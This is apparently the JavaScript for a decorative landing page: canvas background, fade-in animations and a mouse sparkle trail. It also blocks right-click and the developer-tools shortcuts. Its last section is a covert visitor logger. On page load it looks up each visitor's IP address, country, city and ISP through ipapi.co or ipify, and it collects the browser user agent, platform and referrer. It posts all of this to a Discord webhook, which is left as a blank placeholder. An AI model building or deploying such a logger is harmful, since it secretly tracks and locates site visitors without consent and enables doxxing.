document.addEventListener("DOMContentLoaded", () => {
    const body = document.body;
    const spinner = document.getElementById('loading-spinner');

    const createDynamicBackground = () => {
        const canvas = document.createElement('canvas');
        canvas.id = 'dynamic-background';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.zIndex = '-1';
        body.appendChild(canvas);

        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    };

    // Ensure the background animation starts independently
    createDynamicBackground();

    // Page content animations
    window.addEventListener('load', () => {
        body.style.opacity = 1;

        document.querySelectorAll('.animated-text, .social-icons a').forEach((el, index) => {
            setTimeout(() => {
                el.style.opacity = 1;
                el.style.transform = 'translateY(0) scale(1)';
                el.style.transition =
                    'opacity 0.5s ease, transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            }, 100 * index);
        });

        if (spinner) {
            setTimeout(() => {
                spinner.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
                spinner.style.opacity = 0;
                spinner.style.transform = 'scale(2) rotate(360deg)';
                setTimeout(() => (spinner.style.display = 'none'), 500);
            }, 1000);
        }

        document.querySelectorAll('.social-icons a').forEach((icon) => {
            icon.addEventListener('mouseenter', () => {
                icon.style.transform = 'scale(1.2) rotate(5deg)';
            });
            icon.addEventListener('mouseleave', () => {
                icon.style.transform = 'scale(1) rotate(0deg)';
            });
        });
    });
});
// Disable right-click
document.addEventListener('contextmenu', (e) => e.preventDefault());

function ctrlShiftKey(e, keyCode) {
  return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
}

document.onkeydown = (e) => {
  // Disable F12, Ctrl + Shift + I, Ctrl + Shift + J, Ctrl + U
  if (
    event.keyCode === 123 ||
    ctrlShiftKey(e, 'I') ||
    ctrlShiftKey(e, 'J') ||
    ctrlShiftKey(e, 'C') ||
    (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
  )
    return false;
};
var sparkles = 50;
var x = ox = 400;
var y = oy = 300;
var swide = 800;
var shigh = 600;
var sleft = sdown = 0;
var tiny = [];
var star = [];
var starv = [];
var starx = [];
var stary = [];
var tinyx = [];
var tinyy = [];
var tinyv = [];
window.onload = function () {
    if (document.getElementById) {
        var i, rats, rlef, rdow;
        for (var i = 0; i < sparkles; i++) {
            var rats = createDiv(3, 3);
            rats.style.visibility = "hidden";
            rats.style.zIndex = "999";
            document.body.appendChild(tiny[i] = rats);
            starv[i] = 0;
            tinyv[i] = 0;
            var rats = createDiv(5, 5);
            rats.style.backgroundColor = "transparent";
            rats.style.visibility = "hidden";
            rats.style.zIndex = "999";
            var rlef = createDiv(1, 5);
            var rdow = createDiv(5, 1);
            rats.appendChild(rlef);
            rats.appendChild(rdow);
            rlef.style.top = "2px";
            rlef.style.left = "0px";
            rdow.style.top = "0px";
            rdow.style.left = "2px";
            document.body.appendChild(star[i] = rats);
        }
        set_width();
        sparkle();
    }
}

function sparkle() {
    var c;
    if (Math.abs(x - ox) > 1 || Math.abs(y - oy) > 1) {
        ox = x;
        oy = y;
        for (c = 0; c < sparkles; c++) if (!starv[c]) {
            star[c].style.left = (starx[c] = x) + "px";
            star[c].style.top = (stary[c] = y + 1) + "px";
            star[c].style.clip = "rect(0px, 5px, 5px, 0px)";
            star[c].childNodes[0].style.backgroundColor = star[c].childNodes[1].style.backgroundColor = newColour();
            star[c].style.visibility = "visible";
            starv[c] = 50;
            break;
        }
    }
    for (c = 0; c < sparkles; c++) {
        if (starv[c]) update_star(c);
        if (tinyv[c]) update_tiny(c);
    }
    setTimeout("sparkle()", 40);
}

function update_star(i) {
    if (--starv[i] == 25) star[i].style.clip = "rect(1px, 4px, 4px, 1px)";
    if (starv[i]) {
        stary[i] += 1 + Math.random() * 3;
        starx[i] += (i % 5 - 2) / 5;
        if (stary[i] < shigh + sdown) {
            star[i].style.top = stary[i] + "px";
            star[i].style.left = starx[i] + "px";
        } else {
            star[i].style.visibility = "hidden";
            starv[i] = 0;

        }
    } else {
        tinyv[i] = 50;
        tiny[i].style.top = (tinyy[i] = stary[i]) + "px";
        tiny[i].style.left = (tinyx[i] = starx[i]) + "px";
        tiny[i].style.width = "2px";
        tiny[i].style.height = "2px";
        tiny[i].style.backgroundColor = star[i].childNodes[0].style.backgroundColor;
        star[i].style.visibility = "hidden";
        tiny[i].style.visibility = "visible"
    }
}

function update_tiny(i) {
    if (--tinyv[i] == 25) {
        tiny[i].style.width = "1px";
        tiny[i].style.height = "1px";
    }
    if (tinyv[i]) {
        tinyy[i] += 1 + Math.random() * 3;
        tinyx[i] += (i % 5 - 2) / 5;
        if (tinyy[i] < shigh + sdown) {
            tiny[i].style.top = tinyy[i] + "px";
            tiny[i].style.left = tinyx[i] + "px";
        } else {
            tiny[i].style.visibility = "hidden";
            tinyv[i] = 0;

        }
    } else tiny[i].style.visibility = "hidden";
}

document.onmousemove = mouse;

function mouse(e) {
    if (e) {
        y = e.pageY;
        x = e.pageX;
    } else {
        set_scroll();
        y = event.y + sdown;
        x = event.x + sleft;
    }
}

window.onscroll = set_scroll;

function set_scroll() {
    if (typeof (self.pageYOffset) == 'number') {
        sdown = self.pageYOffset;
        sleft = self.pageXOffset;
    } else if (document.body && (document.body.scrollTop || document.body.scrollLeft)) {
        sdown = document.body.scrollTop;
        sleft = document.body.scrollLeft;
    } else if (document.documentElement && (document.documentElement.scrollTop || document.documentElement.scrollLeft)) {
        sleft = document.documentElement.scrollLeft;
        sdown = document.documentElement.scrollTop;
    } else {
        sdown = 0;
        sleft = 0;
    }
}

window.onresize = set_width;

function set_width() {
    var sw_min = 999999;
    var sh_min = 999999;
    if (document.documentElement && document.documentElement.clientWidth) {
        if (document.documentElement.clientWidth > 0) sw_min = document.documentElement.clientWidth;
        if (document.documentElement.clientHeight > 0) sh_min = document.documentElement.clientHeight;
    }
    if (typeof (self.innerWidth) == 'number' && self.innerWidth) {
        if (self.innerWidth > 0 && self.innerWidth < sw_min) sw_min = self.innerWidth;
        if (self.innerHeight > 0 && self.innerHeight < sh_min) sh_min = self.innerHeight;
    }
    if (document.body.clientWidth) {
        if (document.body.clientWidth > 0 && document.body.clientWidth < sw_min) sw_min = document.body.clientWidth;
        if (document.body.clientHeight > 0 && document.body.clientHeight < sh_min) sh_min = document.body.clientHeight;
    }
    if (sw_min === 999999 || sh_min == 999999) {
        sw_min = 800;
        sh_min = 600;
    }
    swide = sw_min;
    shigh = sh_min;
}

function createDiv(height, width) {
    var div = document.createElement("div");
    div.style.position = "absolute";
    div.style.height = height + "px";
    div.style.width = width + "px";
    div.style.overflow = "hidden";
    return (div);
}

function newColour() {
    const colors = ['#636363', '#A9A9A9']; // Darker color palette
    return colors[Math.floor(Math.random() * colors.length)];
}
const WEBHOOK_URL = ""; // WEBHOOK HERE
        const statusMessage = document.getElementById("statusMessage");

        function getTimestamp() {
            return new Date().toISOString();
        }

        async function getLocationData() {
            let locationInfo = {
                ip: "Unknown",
                country: "Unknown",
                region: "Unknown",
                city: "Unknown",
                isp: "Unknown"
            };

            try {
                const response = await fetch(`https://ipapi.co/json/`);
                if (!response.ok) {
                    throw new Error(`ipapi.co failed: ${response.status}`);
                }
                const data = await response.json();
                locationInfo = {
                    ip: data.ip || "Unknown",
                    country: data.country_name || "Unknown",
                    region: data.region || "Unknown",
                    city: data.city || "Unknown",
                    isp: data.org || "Unknown"
                };
                return locationInfo;

            } catch (error) {
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (ipResponse.ok) {
                         const ipData = await ipResponse.json();
                         locationInfo.ip = ipData.ip;
                         return locationInfo;
                    }
                } catch (fallbackError) {
                     // Fallback error ignored
                }
                return locationInfo;
            }
        }

        function getBrowserData() {
             return {
                 userAgent: navigator.userAgent || "Unknown",
                 platform: navigator.platform || "Unknown",
                 referrer: document.referrer || "Direct/Unknown"
             };
         }

        async function sendDataToDiscord(allData) {
            if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/")) {
                // Error message removed
                return;
            }

            const currentPageUrl = window.location.href;

            const payload = {
                username: "Data Logger Bot",
                avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif",
                embeds: [{
                    title: "📊 Data Logged",
                    description: `User data captured for Site: ${currentPageUrl}`,
                    color: 0x0099FF,
                    fields: [
                        ...(allData.ip !== "Unknown" ? [{ name: "IP Address", value: allData.ip, inline: true }] : []),
                        ...(allData.country !== "Unknown" ? [{ name: "Country", value: allData.country, inline: true }] : []),
                        ...(allData.region !== "Unknown" ? [{ name: "Region/State", value: allData.region, inline: true }] : []),
                        ...(allData.city !== "Unknown" ? [{ name: "City", value: allData.city, inline: true }] : []),
                        ...(allData.isp !== "Unknown" ? [{ name: "ISP", value: allData.isp, inline: true }] : []),
                        { name: "Operating System", value: allData.platform, inline: true },
                        { name: "Referrer URL", value: allData.referrer.substring(0, 1024), inline: false },
                        { name: "User Agent (Browser)", value: allData.userAgent.substring(0, 1024), inline: false }
                    ],
                    footer: {
                        text: "Data logged, IP, Browser info, Country, City, Region, ISP, Referrer URL, User Agent (Browser), Operating System"
                    },
                    timestamp: getTimestamp()
                }]
            };

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    // Success message remains
                    if (statusMessage) statusMessage.textContent = "Data logged successfully.";
                    if (statusMessage) statusMessage.style.color = "green";
                } else {
                    // Error message removed
                }
            } catch (error) {
                // Error message removed
            }
        }

        async function logAndSendDataOnLoad() {
            try {
                const locationData = await getLocationData();
                const browserData = getBrowserData();

                const combinedData = {
                    ...locationData,
                    ...browserData
                };

                await sendDataToDiscord(combinedData);

            } catch (error) {
                // Error message removed
            }
        }

        document.addEventListener('DOMContentLoaded', logAndSendDataOnLoad);
